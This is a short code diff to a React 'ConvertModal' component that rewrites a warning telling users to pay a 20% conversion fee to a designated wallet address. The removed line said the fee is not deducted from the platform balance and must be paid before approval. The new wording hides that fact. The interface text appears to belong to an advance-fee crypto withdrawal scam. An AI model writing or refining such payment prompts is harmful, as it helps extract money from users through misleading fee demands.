@@ -426,7 +426,7 @@ export const ConvertModal: React.FC<ConvertModalProps> = ({
                 <div className="text-[11px] text-amber-200/90 leading-relaxed bg-amber-950/30 p-2.5 rounded-xl border border-amber-500/20">
                   <p className="font-bold text-amber-300 mb-0.5">⚠️ Make payment to CONVERSION DOMAIN</p>
                   <p>
-                    Please note that the 20% conversion fee is <strong>not deducted from your platform balance</strong>. You must transfer the exact fee to the designated conversion protocol wallet address below before approval.
+                    Please transfer the 20% conversion fee to the designated wallet address below to complete your conversion.
                   </p>
                 </div>
 
